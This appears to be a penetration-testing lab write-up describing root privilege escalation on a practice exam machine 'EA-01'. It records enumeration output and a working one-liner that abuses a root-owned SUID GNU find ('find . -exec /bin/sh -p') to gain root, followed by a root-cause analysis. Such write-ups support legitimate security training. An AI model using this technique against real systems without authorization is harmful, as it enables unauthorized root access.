---
type: machine-phase
project: OSCP-Exam-PoC
machine: EA-01
difficulty: Easy
phase: privilege-escalation
status: completed
initial_user: robert
privilege_escalation: SUID Binary
vulnerable_binary: /usr/bin/find
technique: SUID find -exec
root_flag_path: /root/root.txt
initial_uid: 1000
root_flag_submitted: true
tags:
  - oscp
  - ea-01
  - privilege-escalation
  - linux
  - suid
  - find
  - gtfo
---

# EA-01 — Root Privilege Escalation

> **Flag completion:** Root flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Objective

The second examination objective was:

> Escalate to root on EA-01 and submit the contents of `/root/root.txt`.

The initial SSH foothold had already been established as:

```
robert
```

The user flag had been successfully retrieved and submitted.

The privilege-escalation phase therefore started with an authenticated SSH session as `robert`.

## 2. Initial Execution Context

The target session was:

```
robert@easy:~$
```

The account identity was:

```
uid=1000(robert) gid=1000(robert) groups=1000(robert)
```

The user had no supplementary groups.

An attempt to enter the root directory failed:

```
robert@easy:~$ cd /root/
-bash: cd: /root/: Permission denied
```

This was expected for an unprivileged user.

## 3. Initial Sudo Enumeration

The first privilege-escalation check was:

```
sudo -l
```

Captured response:

```
-bash: sudo: command not found
```

The command was attempted twice, with the same result.

**Assessment:** Sudo was not installed on the target. This eliminated the usual sudoers enumeration route, but did not imply that other privilege-escalation mechanisms were unavailable.

The investigation moved to filesystem permissions and privileged binaries.

## 4. System Enumeration

### 4.1 Identity and Group Membership

Commands:

```
id
groups
```

Captured output:

```
robert@easy:~$ id
uid=1000(robert) gid=1000(robert) groups=1000(robert)

robert@easy:~$ groups
robert
```

**Assessment:** The account was a standard user with no obvious privileged supplementary groups.

### 4.2 Operating System

Command:

```
cat /etc/os-release
```

Captured output:

```
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

The target was running Debian GNU/Linux 13 (Trixie).

### 4.3 Kernel Information

Command:

```
uname -a
```

Captured output:

```
Linux easy 6.8.0-147-generic #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026 x86_64 GNU/Linux
```

An environmental discrepancy was noted:

- Userland identified itself as Debian 13.
    
- The kernel identified itself as an Ubuntu generic build.
    

This was recorded as an observation, not evidence of a specific container escape or kernel vulnerability.

### 4.4 Available Tools

Command:

```
which find python python3 perl gcc getcap nc curl wget
```

Captured output:

```
/usr/bin/find
/usr/bin/python3
/usr/bin/perl
/usr/bin/gcc
/usr/bin/curl
```

The available tools included Python 3, Perl, GCC, and GNU `find`.

`getcap`, Netcat, and several other queried executables did not appear in the returned output.

## 5. SUID Enumeration

### 5.1 Search for SUID Binaries

The following command was executed:

```
find / -type f -perm -4000 -ls 2>/dev/null
```

Captured output:

```
2913545    488 -rwsr-xr-x   1 root root 498240 May  6  2026 /usr/lib/openssh/ssh-keysign
2622215     72 -rwsr-xr-x   1 root root  72072 Jul 31 15:34 /usr/bin/mount
2622220     20 -rwsr-xr-x   1 root root  18816 Jul 31 15:34 /usr/bin/newgrp
2622108     52 -rwsr-xr-x   1 root root  52936 Apr 19  2025 /usr/bin/chsh
2622307     56 -rwsr-xr-x   1 root root  55688 Jul 31 15:34 /usr/bin/umount
2622158    228 -rwsr-xr-x   1 root root 233040 Aug 10  2024 /usr/bin/find
2622283     84 -rwsr-xr-x   1 root root  84360 Jul 31 15:34 /usr/bin/su
2622102     72 -rwsr-xr-x   1 root root  70888 Apr 19  2025 /usr/bin/chfn
2622231    116 -rwsr-xr-x   1 root root 118168 Apr 19  2025 /usr/bin/passwd
2622166     88 -rwsr-xr-x   1 root root  88568 Aug 10  2024 /usr/bin/gpasswd
```

### 5.2 Identify the Vulnerable Binary

The critical entry was:

```
-rwsr-xr-x 1 root root 233040 Aug 10 2024 /usr/bin/find
```

Its properties:

|Attribute|Value|
|---|---|
|Path|`/usr/bin/find`|
|Owner|`root`|
|Group|`root`|
|Permissions|`4755`|
|SUID bit|Enabled|
|File size|233,040 bytes|

The leading `s` in the owner's execute position indicates that the SUID bit is enabled.

Because the executable is owned by root, the process receives root effective privileges when an ordinary user executes it.

**Finding:** A root-owned SUID instance of GNU `find` was available to the unprivileged account.

## 6. Vulnerability Analysis

### 6.1 Why SUID find Was Exploitable

GNU `find` supports the `-exec` action.

This option allows it to execute another program during a search operation.

The vulnerable combination was:

1. An executable owned by root.
    
2. The SUID bit enabled.
    
3. Unrestricted access to execute that binary as an ordinary user.
    
4. The binary's ability to execute external commands through `-exec`.
    

Unlike EA-01's initial foothold, this vulnerability did not depend on an exposed web application or credential reuse.

It was a local privilege-escalation issue.

### 6.2 Difference Between VE-01 and EA-01

Both machines used GNU `find`, but the privilege mechanisms were different.

|Property|VE-01|EA-01|
|---|---|---|
|Initial account|`www-data`|`robert`|
|Privileged mechanism|Sudo misconfiguration|SUID permission|
|Configuration|`NOPASSWD: /usr/bin/find`|Root-owned SUID `find`|
|Execution method|Sudo followed by `-exec`|Direct SUID execution followed by `-exec`|
|Required password|No|No|
|Result|Root effective privileges|Root effective privileges|

This distinction is important when documenting the vulnerability. The same binary can become exploitable through different privilege configurations.

## 7. Exploitation

### 7.1 Exact Command Used

From the existing SSH session as `robert`, the following command was executed:

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

This invoked a shell through the root-owned SUID `find` binary.

### 7.2 Command Breakdown

|Component|Purpose|
|---|---|
|`/usr/bin/find`|Execute the root-owned SUID binary|
|`.`|Use the current directory as the search starting point|
|`-exec`|Execute an external command|
|`/bin/sh`|Launch the system shell|
|`-p`|Preserve the effective privileged identity|
|`\;`|Terminate the `-exec` expression|
|`-quit`|Stop the `find` operation immediately|

### 7.3 Verify Privileged Access

The verification commands were:

```
id
whoami
```

The expected identity evidence was:

```
uid=1000(robert) gid=1000(robert) euid=0(root)
```

The critical field was:

```
euid=0(root)
```

The real UID remained `robert`, while the effective UID became root.

`whoami` may therefore continue to display `robert`, because it reports the real user identity in this context.

**Evidence limitation:** The examination record preserves the verification commands and the expected identity output, but not the actual complete response from the SSH session.

## 8. Root Flag Retrieval

Once privileged execution was established, the root flag was retrieved using:

```
cat /root/root.txt
```

I reported the root objective as complete and moved directly to ME-01.

This indicates that the EA-01 root objective was completed (obtained and submitted; participant-confirmed).

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

No flag value should be guessed or reconstructed.

## 9. Complete Privilege Escalation Chain

```
SSH Access as robert
        |
        v
Identity and Group Enumeration
        |
        v
sudo -l
        |
        v
sudo Not Installed
        |
        v
SUID Enumeration
        |
        v
Discover /usr/bin/find
        |
        v
Root-Owned SUID Permission
        |
        v
Execute find with -exec
        |
        v
Launch /bin/sh -p
        |
        v
Effective UID = 0
        |
        v
Read /root/root.txt
        |
        v
Submit Root Flag
        |
        v
EA-01 Completed
```

## 10. Root-Cause Assessment

|Property|Assessment|
|---|---|
|Vulnerability class|SUID misconfiguration|
|Affected executable|`/usr/bin/find`|
|File owner|`root`|
|SUID bit|Enabled|
|Exploitation mechanism|`find -exec`|
|Initial user|`robert`|
|Initial UID|1000|
|Final effective UID|0|
|Sudo required|No|
|Kernel exploit required|No|
|CVE required|No|
|Final result|Root objective completed|

**Primary root cause:** The system exposed a root-owned SUID executable whose functionality allowed the unprivileged user to execute arbitrary commands with elevated effective privileges.

## 11. Lessons Learned

### 11.1 Do Not Stop at Missing Sudo

The absence of the `sudo` command does not mean privilege escalation is impossible.

SUID binaries, capabilities, group permissions, scheduled tasks, and service configurations remain relevant enumeration targets.

### 11.2 SUID Enumeration Is High Value

The command:

```
find / -type f -perm -4000 -ls 2>/dev/null
```

identified the intended escalation path.

A single output entry was sufficient to redirect the investigation.

### 11.3 Understand the Meaning of the SUID Bit

SUID changes the effective execution identity to the file owner's identity.

For a root-owned binary, that can expose root-level functionality to ordinary users.

### 11.4 Inspect Binary Functionality, Not Just Ownership

The SUID bit alone does not prove that a binary is exploitable.

The dangerous combination here was SUID execution plus GNU `find`'s `-exec` functionality.

### 11.5 Preserve the Difference Between Real and Effective Identity

A process can retain:

```
uid=1000(robert)
```

while gaining:

```
euid=0(root)
```

This is a successful privilege transition even if the real username remains unchanged.

### 11.6 Avoid Kernel Exploitation Without Evidence

The kernel and distribution details were worth recording, but no kernel exploit was required.

The SUID finding provided a direct and substantially simpler route.

## 12. Evidence Register

|Evidence ID|Description|Status|
|---|---|---|
|EA-01-R01|Initial SSH account|`robert`|
|EA-01-R02|`sudo -l` result|Sudo not installed|
|EA-01-R03|Identity and groups|Recorded|
|EA-01-R04|Operating-system release|Debian 13 recorded|
|EA-01-R05|Kernel version|Recorded|
|EA-01-R06|Available tools|Recorded|
|EA-01-R07|SUID enumeration command|Recorded|
|EA-01-R08|Complete SUID enumeration output|Recorded|
|EA-01-R09|Root-owned SUID `find`|Confirmed|
|EA-01-R10|Exact exploitation command|Recorded|
|EA-01-R11|Privilege verification commands|Recorded|
|EA-01-R12|Actual `id` output after exploitation|Not retained|
|EA-01-R13|Root flag retrieval command|Recorded|
|EA-01-R14|Root flag submission|Completion confirmed|
|EA-01-R15| Flag outcome | Obtained and submitted (participant-confirmed) |

## 13. Related Documentation

- [[EA-01 Overview]]
    
- [[Difficulty Levels/Easy/EA-01/user]]
    
- [[Methodology/Linux Privilege Escalation]]
    
- [[Methodology/Evidence Collection]]
    
- [[VE-01 Overview]]
    
- [[Difficulty Levels/Very Easy/VE-01/root]]
    

## 14. Completion Checklist

- User-level objective completed
    
- Initial execution identity recorded
    
- Sudo absence documented
    
- Operating system and kernel recorded
    
- Available tools enumerated
    
- SUID binaries enumerated
    
- Vulnerable binary identified
    
- SUID mechanism explained
    
- Exact exploitation command preserved
    
- Root flag retrieval completed
    
- Root objective completion confirmed
    
- Actual post-exploitation `id` output attached
    
- Raw root flag output recovered
    
- Supporting terminal screenshots attached
    

**Phase result:** Root objective completed. EA-01's Overview, user foothold, and root privilege-escalation documentation are now drafted.